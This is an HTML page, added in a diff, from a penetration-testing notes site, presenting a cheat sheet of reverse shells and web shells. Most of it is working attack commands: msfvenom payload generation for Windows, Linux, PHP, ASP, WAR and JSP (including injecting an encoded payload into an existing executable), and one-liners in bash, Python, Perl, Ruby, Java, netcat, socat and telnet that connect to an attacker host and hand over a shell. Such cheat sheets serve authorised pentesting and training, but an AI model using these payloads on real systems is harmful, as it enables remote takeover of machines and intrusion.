@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Generate Payload - Reverse shells - Notes</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Reverse-shells", url: "#_top", children: [
+              {title: "Msfvenom", url: "#msfvenom" },
+              {title: "Linux", url: "#linux" },
+              {title: "Web-shells - Platform Independent", url: "#web-shells-platform-independent" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../post_exploitation/spawning_shells/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../post_exploitation/spawning_shells/" class="btn btn-xs btn-link">
+        Spawning Shells
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../initial_access_dropper/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../initial_access_dropper/" class="btn btn-xs btn-link">
+        Initial Dropper
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="reverse-shells">Reverse-shells<a class="headerlink" href="#reverse-shells" title="Permanent link">#</a></h1>
+<p>This is s great collection of different types of reverse shells and webshells. Many of the ones listed below comes from this cheat-sheet:<br />
+<a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">https://highon.coffee/blog/reverse-shell-cheat-sheet/</a></p>
+<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+<h2 id="msfvenom">Msfvenom<a class="headerlink" href="#msfvenom" title="Permanent link">#</a></h2>
+<p>There is an important difference between non-staged and staged payload. A <strong>non-staged</strong> shell is sent over in one block. You just send shell in one stage. This can be caught with metasploit multi-handler. But also with netcat.</p>
+<p><strong>staged</strong> shells send them in turn. This can be useful for when you have very small buffer for your shellcode, so you need to divide up the payload. Meterpreter is a staged shell. First it sends some parts of it and sets up the connection, and then it sends some more. This can be caught with metasploit multi-handler but not with netcat.</p>
+<h3 id="windows">Windows<a class="headerlink" href="#windows" title="Permanent link">#</a></h3>
+<h4 id="meterpreter">Meterpreter<a class="headerlink" href="#meterpreter" title="Permanent link">#</a></h4>
+<p><strong>Standard meterpreter</strong></p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -o shell_reverse.exe
+</code></pre>
+
+<pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+</code></pre>
+
+<p><strong>Meterpreter HTTPS</strong></p>
+<p>It makes the meterpreter-traffic look normal. Since it is hidden in https the communication is encrypted and can be used to bypass deep-packet inspections.</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.101 LPORT=443 -f exe -o met_https_reverse.exe
+</code></pre>
+
+<h4 id="non-staged-payload">Non-staged payload<a class="headerlink" href="#non-staged-payload" title="Permanent link">#</a></h4>
+<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o shell_reverse_tcp.exe
+</code></pre>
+
+<pre><code>use exploit/multi/handler
+set payload windows/shell_reverse_tcp
+</code></pre>
+
+<h4 id="staged-payload">Staged payload<a class="headerlink" href="#staged-payload" title="Permanent link">#</a></h4>
+<pre><code>msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o staged_reverse_tcp.exe
+</code></pre>
+
+<p>This must be caught with metasploit. It does not work with netcat.</p>
+<pre><code>use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+</code></pre>
+
+<h3 id="inject-payload-into-binary">Inject payload into binary<a class="headerlink" href="#inject-payload-into-binary" title="Permanent link">#</a></h3>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -e x86/shikata_ga_nai -i 9 -x &quot;/somebinary.exe&quot; -o bad_binary.exe
+</code></pre>
+
+<h2 id="linux">Linux<a class="headerlink" href="#linux" title="Permanent link">#</a></h2>
+<h3 id="binary">Binary<a class="headerlink" href="#binary" title="Permanent link">#</a></h3>
+<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f elf &gt; shell.elf
+</code></pre>
+
+<h3 id="bash">Bash<a class="headerlink" href="#bash" title="Permanent link">#</a></h3>
+<pre><code>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.1.101/80; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+</code></pre>
+
+<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
+</code></pre>
+
+<h3 id="php">Php<a class="headerlink" href="#php" title="Permanent link">#</a></h3>
+<pre><code>php -r '$sock=fsockopen(&quot;ATTACKING-IP&quot;,80);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+
+<h3 id="netcat">Netcat<a class="headerlink" href="#netcat" title="Permanent link">#</a></h3>
+<p><strong>Bind shell</strong></p>
+<pre><code>#Linux
+nc -vlp 5555 -e /bin/bash
+nc 192.168.1.101 5555
+
+# Windows
+nc.exe -nlvp 4444 -e cmd.exe
+</code></pre>
+
+<p><strong>Reverse shell</strong></p>
+<pre><code># Linux
+nc -lvp 5555
+nc 192.168.1.101 5555 -e /bin/bash
+
+# Windows
+nc -lvp 443
+nc.exe 192.168.1.101 443 -e cmd.exe
+</code></pre>
+
+<p><strong>With -e flag</strong></p>
+<pre><code>nc -e /bin/sh ATTACKING-IP 80
+</code></pre>
+
+<pre><code>/bin/sh | nc ATTACKING-IP 80
+</code></pre>
+
+<p><strong>Without -e flag</strong></p>
+<pre><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc ATTACKING-IP 4444 0/tmp/p
+
+</code></pre>
+
+<p>Upgrade Netcat shell to an interactive: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</p>
+<h3 id="socat">Socat<a class="headerlink" href="#socat" title="Permanent link">#</a></h3>
+<p>Listener (Server)</p>
+<pre><code>socat file:`tty`,raw,echo=0 tcp-listen:4444  
+</code></pre>
+
+<p>Callback (Victim/Client)</p>
+<pre><code>socat tcp-connect:10.10.10.10:4444 exec:sh,pty,stderr,setsid,sigint,sane
+</code></pre>
+
+<h3 id="ncat">Ncat<a class="headerlink" href="#ncat" title="Permanent link">#</a></h3>
+<p>Ncat is a better and more modern version of netcat. One feature it has that netcat does not have is encryption. If you are on a pentestjob you might not want to communicate unencrypted.</p>
+<p>Bind</p>
+<pre><code>ncat --exec cmd.exe --allow 192.168.1.101 -vnl 5555 --ssl
+ncat -v 192.168.1.103 5555 --ssl
+</code></pre>
+
+<h3 id="telnet">Telnet<a class="headerlink" href="#telnet" title="Permanent link">#</a></h3>
+<pre><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p
+</code></pre>
+
+<pre><code>telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
+</code></pre>
+
+<h3 id="perl">Perl<a class="headerlink" href="#perl" title="Permanent link">#</a></h3>
+<pre><code>perl -e 'use Socket;$i=&quot;ATTACKING-IP&quot;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+</code></pre>
+
+<h3 id="ruby">Ruby<a class="headerlink" href="#ruby" title="Permanent link">#</a></h3>
+<pre><code>ruby -rsocket -e'f=TCPSocket.open(&quot;ATTACKING-IP&quot;,80).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
+</code></pre>
+
+<h3 id="java">Java<a class="headerlink" href="#java" title="Permanent link">#</a></h3>
+<pre><code>r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p.waitFor()
+</code></pre>
+
+<h3 id="python">Python<a class="headerlink" href="#python" title="Permanent link">#</a></h3>
+<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ATTACKING-IP&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
+</code></pre>
+
+<h2 id="web-shells-platform-independent">Web-shells - Platform Independent<a class="headerlink" href="#web-shells-platform-independent" title="Permanent link">#</a></h2>
+<h3 id="php_1">PHP<a class="headerlink" href="#php_1" title="Permanent link">#</a></h3>
+<p>This php-shell is OS-independent. You can use it on both Linux and Windows.</p>
+<pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw &gt; shell.php
+</code></pre>
+
+<h3 id="asp">ASP<a class="headerlink" href="#asp" title="Permanent link">#</a></h3>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp &gt; shell.asp
+</code></pre>
+
+<h3 id="war">WAR<a class="headerlink" href="#war" title="Permanent link">#</a></h3>
+<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war &gt; shell.war
+</code></pre>
+
+<h3 id="jsp">JSP<a class="headerlink" href="#jsp" title="Permanent link">#</a></h3>
+<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw &gt; shell.jsp
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../post_exploitation/spawning_shells/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../post_exploitation/spawning_shells/" class="btn btn-xs btn-link">
+        Spawning Shells
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../initial_access_dropper/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../initial_access_dropper/" class="btn btn-xs btn-link">
+        Initial Dropper
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/initial_access/reverse_shell.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
